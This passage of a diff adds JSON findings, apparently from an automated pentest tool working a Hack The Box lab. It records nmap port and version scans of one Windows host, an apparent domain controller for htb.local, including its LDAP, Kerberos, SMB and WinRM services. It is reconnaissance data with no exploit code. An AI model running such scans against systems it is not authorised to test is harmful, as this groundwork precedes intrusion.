+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "scan.nmap.quick",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "profile": "open-port-discovery"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "port:135",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 135,
+          "protocol": "tcp",
+          "service": "msrpc"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 135,
+          "protocol": "tcp",
+          "service": "msrpc"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "port:139",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 139,
+          "protocol": "tcp",
+          "service": "netbios-ssn"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "service.smb",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 139,
+          "protocol": "tcp",
+          "service": "netbios-ssn"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "smb.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 139,
+          "protocol": "tcp",
+          "service": "netbios-ssn"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "port:3268",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "globalcatLDAP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.184
+      },
+      {
+        "kind": "service.globalcatldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "globalcatLDAP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "globalcatLDAP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:3269",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "globalcatLDAPssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.globalcatldapssl",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "globalcatLDAPssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "globalcatLDAPssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:389",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.ldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:445",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.smb",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "smb.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:464",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 464,
+          "protocol": "tcp",
+          "service": "kpasswd5"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.kpasswd5",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 464,
+          "protocol": "tcp",
+          "service": "kpasswd5"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:47001",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "winrm"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.winrm",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "winrm"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "winrm.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "winrm"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "medium",
+          "tool": "nmap",
+          "evidence": "47001/tcp winrm"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49664",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49664,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49664,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49665",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49665,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49665,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49666",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49666,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49666,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49668",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49668,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49668,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49670",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49670,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49670,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49676",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49676,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49676,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49677",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49677,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49677,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49683",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49683,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49683,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49698",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49698,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49698,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:49952",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49952,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.unknown",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 49952,
+          "protocol": "tcp",
+          "service": "unknown"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:53",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 53,
+          "protocol": "tcp",
+          "service": "domain"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.dns",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 53,
+          "protocol": "tcp",
+          "service": "domain"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "dns.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 53,
+          "protocol": "tcp",
+          "service": "domain"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:593",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 593,
+          "protocol": "tcp",
+          "service": "http-rpc-epmap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.http-rpc-epmap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 593,
+          "protocol": "tcp",
+          "service": "http-rpc-epmap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:5985",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "wsman"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.wsman",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "wsman"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "winrm.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 5985,
+          "protocol": "tcp",
+          "service": "wsman"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "medium",
+          "tool": "nmap",
+          "evidence": "5985/tcp wsman"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:636",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "ldapssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.ldapssl",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "ldapssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 636,
+          "protocol": "tcp",
+          "service": "ldapssl"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:88",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.kerberos-sec",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "kerberos.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 88,
+          "protocol": "tcp",
+          "service": "kerberos-sec"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "port:9389",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 9389,
+          "protocol": "tcp",
+          "service": "adws"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "service.adws",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 9389,
+          "protocol": "tcp",
+          "service": "adws"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ports.open",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "ports": [
+            53,
+            88,
+            135,
+            139,
+            389,
+            445,
+            464,
+            593,
+            636,
+            3268,
+            3269,
+            5985,
+            9389,
+            47001,
+            49664,
+            49665,
+            49666,
+            49668,
+            49670,
+            49676,
+            49677,
+            49683,
+            49698,
+            49952
+          ]
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.185
+      },
+      {
+        "kind": "ad.dc_candidate",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "ports": [
+            88,
+            389,
+            445
+          ]
+        },
+        "state": "supported",
+        "source": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "created_at": 1791740941.186
+      },
+      {
+        "kind": "host.up",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "target": "10.129.105.202"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.057
+      },
+      {
+        "kind": "port:135",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 135,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.msrpc",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 135,
+          "protocol": "tcp",
+          "service": "msrpc",
+          "version": "Microsoft Windows RPC"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:139",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 139,
+          "protocol": "tcp",
+          "service": "netbios-ssn",
+          "version": "Microsoft Windows netbios-ssn"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.smb",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 139,
+          "protocol": "tcp",
+          "service": "netbios-ssn",
+          "version": "Microsoft Windows netbios-ssn"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:3268",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.ldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3268,
+          "protocol": "tcp",
+          "service": "ldap"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:3269",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.tcpwrapped",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "ldap.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 3269,
+          "protocol": "tcp",
+          "service": "tcpwrapped"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:389",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.ldap",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 389,
+          "protocol": "tcp",
+          "service": "ldap",
+          "version": "Microsoft Windows Active Directory LDAP Domain: htb.local, Site: Default-First-Site-Name"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:445",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds",
+          "version": "Windows Server 2016 Standard 14393 microsoft-ds workgroup: HTB"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.smb",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 445,
+          "protocol": "tcp",
+          "service": "microsoft-ds",
+          "version": "Windows Server 2016 Standard 14393 microsoft-ds workgroup: HTB"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "port:47001",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 SSDP/UPnP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "service.http",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "http",
+          "version": "Microsoft HTTPAPI httpd 2.0 SSDP/UPnP"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "winrm.reachable",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "port": 47001,
+          "protocol": "tcp",
+          "service": "http"
+        },
+        "state": "supported",
+        "source": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "created_at": 1791741035.058
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "medium",
+          "tool": "nmap",
